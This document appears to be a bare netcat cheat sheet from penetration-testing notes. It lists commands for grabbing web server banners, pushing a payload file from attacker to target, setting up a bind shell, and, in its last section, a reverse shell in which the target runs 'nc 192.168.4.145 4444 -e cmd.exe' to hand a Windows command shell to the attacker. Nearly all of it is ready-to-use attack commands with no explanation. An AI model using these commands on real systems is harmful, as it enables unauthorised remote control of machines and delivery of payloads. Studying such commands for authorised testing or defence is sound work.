Web Server Info
----------------------

    nc 192.168.x.x 80

    HEAD / HTTP/1.0
    GET / HTTP/1.0

File Transfer
----------------------

    TARGET		nc -lvp xxxx > /root/payload
    ATTACKER	nc 192.168.TARGET xxxx </root/payload




Windows OS to Linux OS,  Bind Shell
--------------------------------------------

    Target		Linux   : nc -lvp 4444 
    Attacker	Windows : nc 192.168.4.145 4444

Linux OS to Windows OS, Reverse Shell
--------------------------------------------

    Attacker	Linux   : nc -lvp 4444
    Target		Windows : nc 192.168.4.145 4444 -e cmd.exe 


